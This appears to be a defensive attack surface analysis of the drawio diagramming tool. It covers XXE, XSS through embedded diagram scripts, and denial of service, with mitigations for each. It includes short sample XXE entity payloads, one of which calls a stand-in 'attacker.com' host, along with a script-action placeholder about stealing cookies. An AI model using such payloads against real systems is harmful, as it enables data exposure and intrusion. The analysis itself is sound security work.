# Attack Surface Analysis for jgraph/drawio

## Attack Surface: [XML External Entity (XXE) Injection (Server-Side)](./attack_surfaces/xml_external_entity__xxe__injection__server-side_.md)

*   **Description:** Exploitation of vulnerabilities in the *server-side* XML parsing of drawio diagram data to access local files, initiate network requests (SSRF), or cause denial of service. This is the most critical vulnerability.
*   **How drawio Contributes:** drawio's core data format is XML (or a compressed variant).  If the server-side application parses this data without proper security measures, it becomes vulnerable to XXE.
*   **Example:** A malicious diagram file uploaded to the server contains an XXE payload like `<!DOCTYPE doc [ <!ENTITY xxe SYSTEM "http://internal-server/sensitive-data"> ]>`.  The server's XML parser processes this, making a request to the internal server and potentially exposing sensitive data.
*   **Impact:** Local file disclosure (including configuration files, source code, etc.), server-side request forgery (SSRF) allowing access to internal systems and data, denial of service (DoS).
*   **Risk Severity:** Critical
*   **Mitigation Strategies (Developers):**
    *   **Use a secure XML parsing library.**  Examples include `lxml` with `defusedxml` in Python, a properly configured `XMLReader` in PHP, or similar secure parsers in other languages.
    *   ***Explicitly disable* external entity resolution and DTD processing** in the server-side XML parser's configuration. This is the most crucial step.
    *   **Validate diagram data *before* parsing.**  Check for basic structural integrity and file size limits to prevent some DoS attacks.
    *   **Consider processing diagrams in a sandboxed or isolated environment** to limit the impact of any successful exploitation.

## Attack Surface: [XML External Entity (XXE) Injection (Client-Side)](./attack_surfaces/xml_external_entity__xxe__injection__client-side_.md)

*   **Description:** Exploitation of vulnerabilities in the *client-side* (browser-based) XML parsing of drawio diagram data. While less severe than server-side XXE due to browser sandboxing, it remains a high-risk vulnerability.
*   **How drawio Contributes:** drawio, running within the browser, parses XML to render diagrams.  If the browser's XML parser or drawio's handling of it is vulnerable, XXE can be exploited.
*   **Example:** A malicious diagram file contains an XXE payload like `<!DOCTYPE doc [ <!ENTITY xxe SYSTEM "file:///some/local/file"> ]>`.  The browser's XML parser might attempt to read the local file (though success is limited by browser security).  A more likely attack is client-side SSRF: `<!DOCTYPE doc [ <!ENTITY xxe SYSTEM "http://attacker.com/data"> ]>`. 
*   **Impact:** Client-initiated server-side request forgery (SSRF), limited local file disclosure (depending on browser and OS), denial of service (DoS).
*   **Risk Severity:** High
*   **Mitigation Strategies (Developers & Users):**
    *   **Developers:**
        *   **Ensure drawio is configured to *disable* external entity resolution and DTD processing.**  This is often a configuration option within drawio itself. Verify its effectiveness.
        *   **Use the latest version of drawio** to benefit from any security patches in its dependencies.
        *   **Implement a strong Content Security Policy (CSP)** to restrict the resources the browser can load, mitigating the impact of XXE.
    *   **Users:**
        *   **Keep your browser up-to-date** to benefit from the latest security features and patches.
        *   **Be cautious about opening diagrams from untrusted sources.**

## Attack Surface: [Cross-Site Scripting (XSS) via Embedded Scripts](./attack_surfaces/cross-site_scripting__xss__via_embedded_scripts.md)

*   **Description:** Injection of malicious JavaScript code into a drawio diagram, which is then executed in the context of the application when the diagram is viewed.
*   **How drawio Contributes:** drawio *might* allow embedding JavaScript for interactive features or custom actions within diagrams.  If this functionality is not properly handled, it creates an XSS vulnerability.
*   **Example:** A diagram contains a shape with a custom action containing malicious JavaScript: `<action on="click"><![CDATA[/* malicious code here, e.g., stealing cookies */]]></action>`. 
*   **Impact:** Session hijacking, data exfiltration (stealing user data), defacement of the application, phishing attacks.
*   **Risk Severity:** High
*   **Mitigation Strategies (Developers):**
    *   **Disable or severely restrict script execution within diagrams** using drawio's configuration options. This is the preferred approach.
    *   **If scripting is absolutely necessary, implement *extremely* strict input validation and sanitization** on any data that could be interpreted as code. This is difficult to do correctly and should be avoided if possible.
    *   **Use a strong Content Security Policy (CSP)** to prevent the execution of inline scripts and restrict the sources from which scripts can be loaded.
    *   **Properly encode all output** to prevent any injected code from being interpreted as executable.

## Attack Surface: [Denial of Service (DoS) (Server-Side)](./attack_surfaces/denial_of_service__dos___server-side_.md)

*   **Description:**  Overloading the *server* with excessively large or complex drawio diagrams, causing resource exhaustion and making the application unavailable.
*   **How drawio Contributes:**  The server-side application needs to process and potentially store drawio diagram data, which can be manipulated to consume excessive resources.
*   **Example:**  An attacker uploads a diagram with a deeply nested XML structure (an "XML bomb") or a very large number of objects, designed to consume excessive memory or CPU during parsing.
*   **Impact:**  Application unavailability, server resource exhaustion.
*   **Risk Severity:** High
*   **Mitigation Strategies (Developers):**
    *   **Implement strict limits on the size and complexity of diagrams** that can be uploaded and processed. This includes limits on file size, number of elements, and nesting depth.
    *   **Use rate limiting** to prevent attackers from submitting a large number of diagrams in a short period.
    *   **Monitor server resource usage (CPU, memory, disk I/O)** and set up alerts for unusual activity that might indicate a DoS attack.

